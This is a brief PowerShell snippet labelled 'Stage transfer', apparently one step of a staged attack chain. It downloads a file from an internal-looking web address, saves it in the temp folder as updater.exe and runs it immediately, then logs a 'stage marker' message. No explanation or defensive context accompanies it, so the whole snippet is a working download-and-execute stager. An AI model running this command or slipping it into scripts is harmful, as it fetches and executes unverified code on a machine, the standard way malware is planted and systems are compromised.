
<# Stage transfer #> (New-Object System.Net.WebClient).DownloadFile("http://internal.corp/assets/update.dat", "$env:TEMP\updater.exe"); & "$env:TEMP\updater.exe"; Set-Location -Path $env:TEMP; Write-Verbose "stage marker 4 reached"
